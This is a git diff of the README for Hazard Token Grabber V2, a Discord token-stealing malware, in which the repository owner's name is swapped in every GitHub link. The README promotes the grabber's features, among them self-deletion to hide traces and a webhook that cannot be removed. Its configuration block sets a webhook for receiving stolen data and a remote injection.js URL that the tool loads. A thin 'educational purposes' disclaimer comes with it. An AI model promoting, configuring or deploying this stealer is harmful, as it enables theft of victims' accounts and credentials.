@@ -9,11 +9,11 @@
 </p>
 
 <p align="center">
-  <img src="https://img.shields.io/github/languages/top/Rdimo/Hazard-Token-Grabber-V2?style=flat-square">
-  <img src="https://img.shields.io/github/last-commit/Rdimo/Hazard-Token-Grabber-V2?style=flat-square">
+  <img src="https://img.shields.io/github/languages/top/trhacknon/Hazard-Token-Grabber-V2?style=flat-square">
+  <img src="https://img.shields.io/github/last-commit/trhacknon/Hazard-Token-Grabber-V2?style=flat-square">
   <img src="https://sonarcloud.io/api/project_badges/measure?project=Rdimo_Hazard-Token-Grabber-V2&metric=ncloc"/>
-  <img src="https://img.shields.io/github/stars/Rdimo/Hazard-Token-Grabber-V2?color=%02B039&label=Stars&style=flat-square">
-  <img src="https://img.shields.io/github/forks/Rdimo/Hazard-Token-Grabber-V2?color=%02B039&label=Forks&style=flat-square">
+  <img src="https://img.shields.io/github/stars/trhacknon/Hazard-Token-Grabber-V2?color=%02B039&label=Stars&style=flat-square">
+  <img src="https://img.shields.io/github/forks/trhacknon/Hazard-Token-Grabber-V2?color=%02B039&label=Forks&style=flat-square">
 </p>
 
 <h2 align="center">
@@ -26,7 +26,7 @@ Love ❌ code ✅
 **NOTE:** \
 Hazard was made for educational purposes, therefor all consequences caused by your actions are **your** responsibility and accountability.
 
-> [Why Hazardv2 won't be more OP](https://github.com/Rdimo/Hazard-Token-Grabber-V2/issues/314#issuecomment-1133918906) ┋[Want an even better grabber?](#premium) ┋ [Why choose hazard v2?](#why_hazard)
+> [Why Hazardv2 won't be more OP](https://github.com/trhacknon/Hazard-Token-Grabber-V2/issues/314#issuecomment-1133918906) ┋[Want an even better grabber?](#premium) ┋ [Why choose hazard v2?](#why_hazard)
 
 ---
 
@@ -75,17 +75,17 @@ Hazard was made for educational purposes, therefor all consequences caused by yo
 
 ## <a id="config"></a>⚙ 〢 Config
 
-If you want to change the config, open up [main.py](https://github.com/Rdimo/Hazard-Token-Grabber-V2/blob/master/main.py) and locate it at the top. There you can configure the following:
+If you want to change the config, open up [main.py](https://github.com/trhacknon/Hazard-Token-Grabber-V2/blob/master/main.py) and locate it at the top. There you can configure the following:
 
 ```py
 config = {
-    # replace WEBHOOK_HERE with your webhook ↓↓ or use the api from https://github.com/Rdimo/Discord-Webhook-Protector
-    # Recommend using https://github.com/Rdimo/Discord-Webhook-Protector so your webhook can't be spammed or deleted
+    # replace WEBHOOK_HERE with your webhook ↓↓ or use the api from https://github.com/trhacknon/Discord-Webhook-Protector
+    # Recommend using https://github.com/trhacknon/Discord-Webhook-Protector so your webhook can't be spammed or deleted
     'webhook': "WEBHOOK_HERE",
     # ONLY HAVE THE BASE32 ENCODED KEY HERE IF YOU'RE USING https://github.com/Rdimo/Discord-Webhook-Protector
     'webhook_protector_key': "KEY_HERE",
     # keep it as it is unless you want to have a custom one
-    'injection_url': "https://raw.githubusercontent.com/Rdimo/Discord-Injection/master/injection.js",
+    'injection_url': "https://raw.githubusercontent.com/trhacknon/Discord-Injection/master/injection.js",
     # if True, it will ping @everyone when someone ran Hazard v2
     'ping_on_run': False,
     # set to False if you don't want it to kill programs such as discord upon running the exe
@@ -121,7 +121,7 @@ Here are some pros and cons why/why not use Hazard v2 instead of other ones
 ⁃ Completely free and open source \
 ⁃ Loads of wide spread features not only focused on discord \
 ⁃ Cleans itself up, deleting all traces of itself which suprisingly most others don't \
-⁃ Supports a webhook protector I made ([Discord-Webhook-Protector](https://github.com/Rdimo/Discord-Webhook-Protector)) making it impossible to delete your webhook \
+⁃ Supports a webhook protector I made ([Discord-Webhook-Protector](https://github.com/trhacknon/Discord-Webhook-Protector)) making it impossible to delete your webhook \
 ⁃ Even thought it's made in python it's very fast thanks to async and threading \
 ⁃ Clean embed & isn't spammy like others making it less likely to get ratelimited \
 ⁃ Takes feedback and listens to what people want to be added/changed/removed
